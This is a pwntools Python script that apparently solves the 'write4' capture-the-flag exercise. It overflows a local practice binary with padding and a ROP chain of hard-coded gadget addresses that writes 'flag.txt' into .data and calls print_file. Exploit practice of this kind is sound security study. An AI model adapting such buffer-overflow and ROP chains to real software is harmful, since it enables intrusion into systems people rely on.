#!/usr/bin/python
from pwn import *
p = process('./write4')


# Setup padding
padding = b"A"*40

# Setup Gadgets
pop_r14_r15 = p64(0x400690)
mov_r14_r15 = p64(0x400628)	# Moves the value of fileName to save_location
				# Use by imputting the data that you want then input the location you want to control then call the gadget
				# In this exploit:
				#	save_location,fileName,mov_r14_r15

save_location = p64(0x601028) 	# Location in .data to save flag.txt
pop_rdi = p64(0x400693)		# Moves the value in .data to rdi
print_file = p64(0x00400510)

# Setup args
fileName = b"flag.txt"

# Create exploit
payload = [
	padding,
	pop_r14_r15,
	save_location,
	fileName,
	mov_r14_r15,
	pop_rdi,
	save_location,
	print_file
]
payload = b"".join(payload)

# Pass ROP chain to binary
print(payload)
p.sendline(payload)

# Print response
response = p.recvall()
print(response.decode("utf-8"))
